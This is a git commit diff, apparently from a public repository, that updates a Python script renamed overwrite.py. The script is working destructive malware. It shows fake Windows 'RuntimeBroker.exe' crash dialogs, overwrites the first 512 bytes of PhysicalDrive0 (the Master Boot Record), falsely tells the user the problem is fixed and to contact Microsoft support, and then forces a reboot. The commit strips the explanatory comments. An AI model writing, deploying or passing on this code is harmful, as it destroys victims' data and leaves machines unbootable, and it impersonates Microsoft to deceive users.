96366f0545205bea3dda22013bfc21b7de7918b9
Disease <83523587+CPScript@users.noreply.github.com>
2024-09-26 10:42:47 -0400

    Update and rename file.py to overwrite.py

--- overwrite.py
+++ overwrite.py
@@ -11,23 +11,17 @@ from sys import exit
 
 time.sleep(2)
 
-# Alert box
 warningtitle = 'Program crashed - RuntimeBroker.exe'
 warningdescription = 'The instruction at 0x00007FF950FCBE4B reference memory at 0x000000000000024, The memory could not written.           Would you like to restart?'
 
 if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: 
   MessageBox("RuntimeBroker.exe is very inportant, your pc could run into many falulars, would you like to restart RuntimeBroker.exe", "Alert - RuntimeBroker.exe", MB_ICONWARNING | MB_OK)
-  # script goes here
 
-# | OverWrite Script |
 hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
-WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite MBR!
-CloseHandle(hDevice) # Close the handle
+WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite
+CloseHandle(hDevice) # Close handle
 
 MessageBox("RuntimeBroker.exe has been fixed, please contact microsoft support if any other problems occur.", "Restarted - RuntimeBroker.exe", MB_ICONWARNING | MB_OK) 
-time.sleep(120)
+time.sleep(5)
 MessageBox("Your PC requires a restart. (Reason: Master Boot Record(MBR) has been changed) Please click ok to restart.", "System", MB_ICONWARNING | MB_OK) 
-
-
-
 os.system("shutdown /r /t 1")
